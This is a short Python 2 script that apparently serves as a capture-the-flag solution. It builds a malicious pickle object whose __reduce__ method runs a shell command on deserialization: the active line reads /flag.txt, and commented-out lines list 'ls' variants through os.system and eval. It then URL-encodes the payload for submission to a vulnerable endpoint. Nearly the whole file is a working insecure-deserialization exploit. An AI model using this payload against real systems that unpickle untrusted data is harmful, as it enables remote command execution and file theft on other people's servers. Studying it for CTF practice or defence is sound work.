import pickle
import urllib
import commands

class A(object):
    def __reduce__(self):
        # return (eval, ("__import__('os').system('ls')",))
        # return (commands.getoutput, ("ls /",))
        return (commands.getoutput, ("cat /flag.txt",))
 
a = A()
s = pickle.dumps(a)
print(urllib.quote(s))